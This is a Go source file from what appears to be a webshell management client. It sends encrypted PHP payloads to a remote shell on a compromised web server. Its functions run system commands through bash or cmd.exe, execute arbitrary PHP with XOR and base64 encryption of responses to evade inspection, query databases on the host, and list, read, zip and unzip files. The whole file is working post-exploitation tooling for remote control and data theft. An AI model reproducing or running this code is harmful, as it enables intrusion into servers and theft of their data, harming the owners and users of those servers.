package service

import (
	"clouddrop/pkg/util"
	"fmt"
	"log"
	"os"
)

var PhpSessions map[int]string

func (s *PHPShell) GetShellType() string {
	return "php"
}

func (s *PHPShell) FreshSession(id int, url string, password string) (string, error) {
	if PhpSessions == nil {
		// first init php shell
		PhpSessions = make(map[int]string)
	}
	// Get the target code and encrypt
	code, _ := os.ReadFile("./pkg/api/php/Check.php")
	code = append(code, []byte("\nmain();")...) // add main() to call

	// 加密code
	enCode := util.Encrypt(string(code), password)

	var err error
	PhpSessions[id], err = util.PostRequestWithoutSession(url, password, enCode)
	if err != nil {
		return "", err
	}

	session := PhpSessions[id] // if key not exist, it returns "" , bcz type is string
	log.Println("当前PHPSESSID " + session)

	enResult, err := util.PostRequest(url, password, enCode, session)
	if err != nil {
		return "", err
	}

	// 解密code
	res := util.Decrypt(enResult, password)

	return res, nil
}

// BaseInfo
func (s *PHPShell) BaseInfo(id int, url string, password string) (string, error) {
	// code := `echo getcwd();`
	code, _ := os.ReadFile("./pkg/api/php/BaseInfo.php")
	code = fmt.Append(code, "\nmain();") // add main() to call

	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
	if err != nil {
		return "", err
	}

	return res, nil
}

// ExecCommand executes a command on the PHP shell and returns the output
func (s *PHPShell) ExecCommand(id int, command string, url string, password string) (string, error) {
	// Todo 需要支持自己上传cmd。适用于某些情况c盘下的cmd.exe没有执行权限

	// 1. first need to get the system type
	code, _ := os.ReadFile("./pkg/api/php/OS.php")
	code = fmt.Append(code, "\nmain();")

	osType, err := util.HookPost(url, password, string(code), PhpSessions[id])
	if err != nil {
		return "", err
	}

	var cmdPath string // in if-block-level scope, it must define at out
	if osType == "Linux" {
		cmdPath = "/bin/bash"
	} else {
		cmdPath = "C:/Windows/System32/cmd.exe"
	}

	// 2. base on the osType, execute the command
	code, _ = os.ReadFile("./pkg/api/php/CMD.php")
	code = fmt.Appendf(code, "\nmain(\"%s\",\"true\",\"%s\");", cmdPath, command)

	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
	if err != nil {
		return "", err
	}

	return res, nil
}

// ExecCode execute user's present shellcode
func (s *PHPShell) ExecCode(id int, code string, url string, password string) (string, error) {
	// 这里有个问题，直接自定义代码的话会缺少返回结果的加密过程，如何解决？发送过去的payload必须含有加密过程
	shellcode := fmt.Sprintf(`
error_reporting(0);
session_start();
$res = main();
echo encrypt($res, $_SESSION['k']);
function main() {
	ob_start(); // 开始输出缓冲
	%s          // 执行传入的代码
	return ob_get_clean(); // 获取缓冲区内容并作为返回值
}
function encrypt($data, $key) {
	for($i=0; $i<strlen($data); $i++) {
		$data[$i] = $data[$i] ^ $key[($i+5)&15];
	}
	return base64_encode($data);
}`, code)
	res, err := util.HookPost(url, password, shellcode, PhpSessions[id])
	if err != nil {
		return "", err
	}
	return res, nil
}

func (s *PHPShell) ExecSql(id int, driver, host, port, user, pass, database, sql, option, encoding, url, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/php/Database.php")

	// step 1, database is "", get all dbname
	if database == "" {
		code = fmt.Appendf(code,
			"\nlistDatabases(\"%s\", \"%s\", \"%s\", \"%s\", \"%s\", \"%s\");", driver, host, port, user, pass, encoding)
	} else {
		// step 2 , user choses dbname
		code = fmt.Appendf(code,
			"\nmain(\"%s\", \"%s\", \"%s\", \"%s\", \"%s\", \"%s\", \"%s\", %s, \"%s\",);", driver, host, port, user, pass, database, sql, option, encoding)
	}

	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
	if err != nil {
		return "", err
	}
	return res, nil
}

func (s *PHPShell) FileZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/php/FileZip.php")
	code = fmt.Appendf(code, "\nmain(\"%s\", \"%s\");", srcPath, toPath)
	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
	if err != nil {
		return "", err
	}
	return res, nil
}

func (s *PHPShell) FileUnZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/php/FileUnZip.php")
	code = fmt.Appendf(code, "\nmain(\"%s\", \"%s\");", srcPath, toPath)
	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
	if err != nil {
		return "", err
	}
	return res, nil
}

// FileList lists all files in the current directory
func (s *PHPShell) FileList(id int, path string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/php/FileList.php")
	code = fmt.Appendf(code, "\nmain(\"%s\");", path)

	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
	if err != nil {
		return "", err
	}
	return res, nil
}

func (s *PHPShell) FileShow(id int, path string, url string, password string) (string, error) {
	code, _ := os.ReadFile("./pkg/api/php/FileShow.php")
	code = fmt.Appendf(code, "\nmain(\"%s\");", path)

	res, err := util.HookPost(url, password, string(code), PhpSessions[id])
	if err != nil {
		return "", err
	}
	return res, nil
}
